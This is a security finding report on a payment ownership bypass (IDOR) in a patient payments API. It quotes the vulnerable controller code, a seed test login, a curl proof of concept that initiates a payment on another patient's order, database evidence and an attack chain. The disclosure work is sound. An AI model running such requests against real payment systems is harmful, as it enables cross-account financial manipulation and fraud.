# Payment Ownership Bypass — CRITICAL (Live-Confirmed)

## Vulnerability Summary

`POST /api/payments/initiate`, `POST /api/payments/verify`, and
`POST /api/payments/validate-otp` never verify that the authenticated patient
**owns** the order/payment they operate on. Patient A can create a payment,
or verify/validate a payment, on Patient B's order.

**Status:** ✅ CONFIRMED ON LIVE — 2026-08-11
**Severity:** Critical (cross-patient financial manipulation)

---

## 1. Vulnerability Identification Process

### 1.1 Static review

`src/payments/payments.controller.ts:35-54` — none of the three handlers
passes `req.user` into the service:

```typescript
@Post('initiate') @Roles(Role.PATIENT)
initiatePayment(@Body() dto: InitiatePaymentDto) {
  return this.paymentsService.initiatePayment(dto);   // ← no req.user
}

@Post('verify') @Roles(Role.PATIENT)
verifyPayment(@Body() dto: VerifyPaymentDto) {
  return this.paymentsService.verifyPayment(dto);     // ← no req.user
}

@Post('validate-otp') @Roles(Role.PATIENT)
validateOTP(@Body() dto: MobileMoneyPaymentDto) {
  return this.paymentsService.validateOTP(dto.paymentId, dto.otp);  // ← no req.user
}
```

`src/payments/payments.service.ts:36-147` — `initiatePayment()` fetches the
order by `dto.orderId` and creates a payment **without comparing
`order.patient.userId` to the caller**. Contrast with `orders.service.ts`
where `findById()` performs an ownership check.

### 1.2 Dynamic confirmation (Alice → Bob's order)

- `alice@patient.com` (seed, `Test@1234`) logs in.
- Bob's order `01957376-79c6-4800-8ccc-1524753f9dd5` (ORD-2026-0006) is used
  as the target.

```bash
curl -s -X POST $BASE/api/payments/initiate \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -d '{"orderId":"01957376-79c6-4800-8ccc-1524753f9dd5"}'

# → 400 "Payment initialization failed: Invalid authorization key"
#   (a Flutterwave API-key error — NOT an authorization denial)
```

DB proof — a payment row was created **for Bob's order by Alice**:

```sql
SELECT id, "orderId", status, amount FROM payments
 WHERE "orderId"='01957376-…' ORDER BY "createdAt" DESC LIMIT 1;
-- 5caf1405-… | 01957376-… | PENDING | 11000.00    ← created by Alice
```

The request passed every application-layer check and only stopped at
Flutterwave's key configuration. With a working key, Alice could:
- initiate a mobile-money charge against Bob's order (Bob's number? no —
  the charge goes to the phone number Alice supplies, then the payment is
  linked to Bob's order),
- verify a payment by guessing Bob's `paymentId`,
- validate an OTP against a payment she doesn't own.

*(The payment row was deleted after the test.)*

---

## 2. Attack Chain

```
Attacker (patient) obtains victim's orderId (UUID leaked via WS/API/DB)
  → POST /api/payments/initiate {orderId: <victim>}
  → payment created on victim's order; provider charge initiated with
    attacker's phone / victim's card depending on flow
  → financial confusion, refunds, or payment-linked stock release
```

---

## 3. Evidence (2026-08-11)

```
Request:  POST /api/payments/initiate  (Alice token, Bob's orderId)
Response: 400 "Payment initialization failed: Invalid authorization key"
DB:       payment row (PENDING, RWF 11,000) created on Bob's order
```

---

## 4. Files

| File | Purpose |
|---|---|
| `exploit.sh` | Cross-patient payment initiation PoC (parameterised) |
| `remediation.md` | Step-by-step remediation |
